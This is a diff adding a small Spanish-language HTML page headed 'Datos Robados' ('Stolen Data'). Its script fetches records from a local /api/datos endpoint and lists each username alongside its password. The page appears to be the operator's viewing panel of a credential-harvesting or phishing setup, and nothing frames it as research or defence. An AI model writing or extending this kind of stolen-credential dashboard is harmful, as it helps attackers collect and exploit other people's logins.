@@ -1,0 +1,29 @@
+<!-- public/display.html -->
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <title>Mostrar Datos</title>
+</head>
+<body>
+    <h1>Datos Robados</h1>
+    <ul id="list"></ul>
+
+    <script>
+        async function cargarDatos() {
+            const res = await fetch('/api/datos');
+            const datos = await res.json();
+
+            const lista = document.getElementById('list');
+            lista.innerHTML = '';
+            datos.forEach(d => {
+                const item = document.createElement('li');
+                item.textContent = `${d.user} - ${d.pass}`;
+                lista.appendChild(item);
+            });
+        }
+
+        cargarDatos();
+    </script>
+</body>
+</html>
